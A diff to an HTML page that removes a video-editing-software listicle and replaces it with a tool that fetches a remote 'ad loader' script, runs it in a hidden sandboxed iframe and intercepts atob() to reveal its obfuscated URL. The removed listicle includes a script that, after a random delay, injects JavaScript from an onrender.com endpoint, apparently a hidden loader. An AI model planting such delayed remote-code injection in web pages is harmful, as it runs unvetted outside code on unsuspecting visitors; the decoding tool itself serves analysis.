@@ -1,71 +1,158 @@
-<!DOCTYPE html>  <html lang="en">    <head>        <meta charset="UTF-8" />          <meta name="viewport" content="width=device-width, initial-scale=1.0"/>        
-  <title>Top 10 Video Editing Software</title>        
-  <link rel="stylesheet" href="style.css" />        
-  <style>        
-    .software-list {        
-      max-width: 900px;        
-      margin: 0 auto;        
-      padding: 1em;        
-    }  .software-item {        
-  margin-bottom: 2em;        
-  border-bottom: 1px solid #ccc;        
-  padding-bottom: 1em;        
-}    .software-item h3 {    
-margin: 0;    
-}  .software-item a {  
-color: #007bff;  
-text-decoration: none;  
-}  .software-item a:hover {
-text-decoration: underline;
-}
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Decoded ad URL</title>
+  <style>
+    html,body{height:100%;margin:0;font-family:system-ui,Arial,-apple-system,Segoe UI;display:flex;align-items:center;justify-content:center;background:#111;color:#fff}
+    .center{max-width:900px;padding:24px;text-align:center}
+    .url{word-break:break-all;font-size:20px;background:#0b0b0b;padding:18px;border-radius:8px;border:1px solid #222}
+    .msg{opacity:.85;margin-top:12px;font-size:14px;color:#ddd}
+    /* Hidden iframe used for decoding */
+    iframe#decoderFrame{display:none !important;width:1px;height:1px;border:0;position:absolute;left:-9999px;top:-9999px}
+  </style>
+</head>
+<body>
+  <div id="root" class="center">
+    <div id="loading" class="msg">Decoding ad loader — waiting for decoded ad URL...</div>
+  </div>
 
-</style>  </head>
+  <!-- hidden sandboxed iframe where loader runs and atob() is intercepted -->
+  <iframe id="decoderFrame" sandbox="allow-scripts"></iframe>
 
-<body>      <header>    <h1>Top 10 Video Editing Software</h1>        
-<nav>        
-  <a href="index.html">Home</a>        
-  <a href="contact.html">Contact</a>        
-  <a href="privacy.html">Privacy Policy</a>  </nav>    </header>    <main class="software-list">        
-    <p>Explore the best video editing tools for creators, from beginner-friendly mobile apps to professional studio software:</p>  <div class="software-item">      <h3><a href="https://www.adobe.com/products/premiere.html" target="_blank">Adobe Premiere Pro</a></h3>        
-  <p>Industry-leading editor used by professionals for film, TV, and web content. Offers timeline-based editing, color grading, and more.</p>        
-</div>    <div class="software-item">        
-  <h3><a href="https://www.apple.com/final-cut-pro/" target="_blank">Final Cut Pro X</a></h3>        
-  <p>Exclusive to macOS, this powerful editor provides blazing-fast performance and intuitive controls for pro filmmakers.</p>        
-</div>    <div class="software-item">        
-  <h3><a href="https://www.blackmagicdesign.com/products/davinciresolve/" target="_blank">DaVinci Resolve</a></h3>        
-  <p>Combines editing, color correction, audio post, and visual effects. Ideal for colorists and editors working at any level.</p>        
-</div>    <div class="software-item">        
-  <h3><a href="https://www.capcut.com/" target="_blank">CapCut</a></h3>        
-  <p>A fast-growing mobile editor with trendy effects, text, and music. Great for TikTok and social content creators.</p>        
-</div>    <div class="software-item">        
-  <h3><a href="https://filmora.wondershare.com/" target="_blank">Filmora</a></h3>        
-  <p>Simple, drag-and-drop video editing with built-in templates and music. Suitable for beginners and hobbyists.</p>        
-</div>    <div class="software-item">        
-  <h3><a href="https://www.apple.com/imovie/" target="_blank">iMovie</a></h3>        
-  <p>Comes free on macOS and iOS. Perfect for quick edits, trailers, and home videos.</p>        
-</div>    <div class="software-item">        
-  <h3><a href="https://fxhome.com/hitfilm" target="_blank">HitFilm Express</a></h3>        
-  <p>Free editor with VFX capabilities and motion tracking. Great for action and sci-fi video projects.</p>        
-</div>    <div class="software-item">        
-  <h3><a href="https://kdenlive.org/en/" target="_blank">Kdenlive</a></h3>        
-  <p>Open-source and powerful, Kdenlive runs on Linux, Windows, and Mac. Ideal for those who want full control without a subscription.</p>        
-</div>    <div class="software-item">        
-  <h3><a href="https://inshot.com/" target="_blank">InShot</a></h3>        
-  <p>Popular mobile app for quick edits, filters, transitions, and music. Widely used by influencers and marketers.</p>        
-</div>    <div class="software-item">        
-  <h3><a href="https://www.blender.org/features/video-editing/" target="_blank">Blender</a></h3>        
-  <p>Primarily a 3D modeling tool, but its built-in video editor is capable and great for timeline-based edits with effects.</p>    </div>    </main>    <footer>        
-    <p>© Devlinks.link. Curated with care for creators worldwide.</p>        
-  </footer>   <script>
-window.addEventListener("load", () => {
-  const min = 2000, max = 6000;
-  const delay = Math.floor(Math.random() * (max - min + 1)) + min;
+  <script>
+  (function(){
+    const LOADER_URL = 'https://webpage-76ur.onrender.com/get-adcode'; // change if needed
+    const TIMEOUT_MS = 10000; // how long to wait for decode before showing error
+    const root = document.getElementById('root');
+    const loadingEl = document.getElementById('loading');
+    const iframe = document.getElementById('decoderFrame');
 
-  setTimeout(() => {
-    const script = document.createElement("script");
-    script.src = "https://a1-1-xxxb.onrender.com/get-adcode"; // Fetches JS directly
-    document.body.appendChild(script);
-  }, delay);
-});
-</script>
- </body>  </html>
+    // Utility to replace page content with a single message (decoded URL or error)
+    function showOnlyMessage(title, message, sub){
+      document.title = title || document.title;
+      root.innerHTML = '';
+      const box = document.createElement('div');
+      box.style.display = 'flex';
+      box.style.flexDirection = 'column';
+      box.style.alignItems = 'center';
+      box.style.justifyContent = 'center';
+      const urlEl = document.createElement('div');
+      urlEl.className = 'url';
+      urlEl.textContent = message;
+      box.appendChild(urlEl);
+      if(sub){
+        const subEl = document.createElement('div');
+        subEl.className = 'msg';
+        subEl.textContent = sub;
+        box.appendChild(subEl);
+      }
+      root.appendChild(box);
+    }
+
+    // Build iframe srcdoc that intercepts atob and posts decoded strings to parent
+    function buildSrcdoc(loaderSourceEscaped){
+      return `
+<!doctype html>
+<html>
+  <head><meta charset="utf-8"><title>decoder-frame</title></head>
+  <body>
+    <script>
+      (function(){
+        // small safe logger
+        function innerLog(m){ try{ /* no-op visual logs inside hidden iframe */ }catch(e){} }
+
+        // intercept atob: post decoded strings to parent
+        const nativeAtob = window.atob;
+        window.atob = function(s){
+          const decoded = nativeAtob.call(this, s);
+          try{ parent.postMessage({type:'atob-decoded', decoded: decoded}, '*'); }catch(e){}
+          innerLog('[atob] ' + decoded);
+          return decoded;
+        };
+
+        // forward console messages back to parent (optional)
+        const rawLog = console.log;
+        console.log = function(){
+          try{ parent.postMessage({type:'console', args: Array.from(arguments)}, '*'); }catch(e){}
+          rawLog.apply(console, arguments);
+        };
+
+        // Run the loader code we injected from parent:
+        try{
+          ${loaderSourceEscaped}
+        }catch(e){
+          try{ parent.postMessage({type:'loader-error', message: String(e)}, '*'); }catch(err){}
+        }
+      })();
+    </script>
+  </body>
+</html>
+`;
+    }
+
+    // Start decode process immediately
+    (async function start(){
+      loadingEl.textContent = 'Fetching loader...';
+      let codeText = null;
+      try{
+        const res = await fetch(LOADER_URL, {mode:'cors'});
+        if(!res.ok) throw new Error('fetch failed: ' + res.status);
+        codeText = await res.text();
+      }catch(err){
+        showOnlyMessage('Decode error', 'Failed to fetch loader', String(err));
+        return;
+      }
+
+      // Prepare loader source for embedding safely into srcdoc
+      // Escape backticks and </script> sequences
+      const escaped = codeText.replace(/`/g,'\\`').replace(/<\\/script>/gi,'<\\\\/script>');
+      iframe.srcdoc = buildSrcdoc(escaped);
+      loadingEl.textContent = 'Loader loaded in sandbox — waiting for atob decode...';
+
+      // Set timeout in case nothing decodes
+      const t = setTimeout(()=>{
+        showOnlyMessage('No decoded URL', 'No URL decoded within timeout (' + (TIMEOUT_MS/1000) + 's).', 'Check loader or CORS.');
+      }, TIMEOUT_MS);
+
+      // Listen for decoded messages from iframe
+      function onMessage(ev){
+        try{
+          const d = ev.data || {};
+          if(d && d.type === 'atob-decoded'){
+            // First choose the decoded value that looks like a URL
+            const decoded = String(d.decoded || '').trim();
+            if(!decoded){
+              // ignore empty, keep waiting
+              return;
+            }
+
+            // prefer first https? URL; otherwise use the first decoded content
+            if(/^https?:\\/\\//i.test(decoded)){
+              clearTimeout(t);
+              window.removeEventListener('message', onMessage);
+              showOnlyMessage('Decoded ad URL', decoded, 'Decoded from loader atob()');
+            } else {
+              // if not a URL, we may still show it (fallback)
+              // but continue listening for potential URL decodes
+              // show temporarily but continue waiting for a URL until timeout
+              showOnlyMessage('Decoded (non-URL)', decoded, 'No URL yet — waiting for https:// decode until timeout');
+            }
+          } else if(d && d.type === 'loader-error'){
+            clearTimeout(t);
+            window.removeEventListener('message', onMessage);
+            showOnlyMessage('Loader error', d.message || 'Unknown loader error');
+          } else if(d && d.type === 'console'){
+            // ignore console forwards
+          }
+        }catch(e){
+          // ignore parsing issues
+        }
+      }
+      window.addEventListener('message', onMessage);
+    })();
+  })();
+  </script>
+</body>
+</html>
